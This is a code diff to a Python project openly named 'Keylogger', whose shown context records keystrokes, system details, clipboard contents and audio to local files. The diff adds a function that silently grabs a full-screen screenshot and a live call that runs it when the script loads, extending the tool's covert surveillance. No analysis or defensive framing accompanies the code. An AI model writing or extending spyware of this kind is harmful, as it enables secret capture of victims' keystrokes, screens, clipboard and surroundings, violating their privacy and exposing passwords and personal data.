@@ -40,6 +40,7 @@ keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
 clipboard_information = "clipboard.txt"
 audio_information = "audio.wav"
+screenshot_information = "screenshot.png"
 
 file_path = "C:\\Users\\user\\Desktop\\Keylogger\\Project"
 extend = "\\"
@@ -70,6 +71,10 @@ def computer_information():
         f.write("Machine Information: " + platform.machine() + "\n")
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
+
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path + extend + screenshot_information)
 
 
 def copy_clipboard():
@@ -153,3 +158,4 @@ def on_release(key):
 # computer_information()
 # copy_clipboard()
 # microphone()
+screenshot()
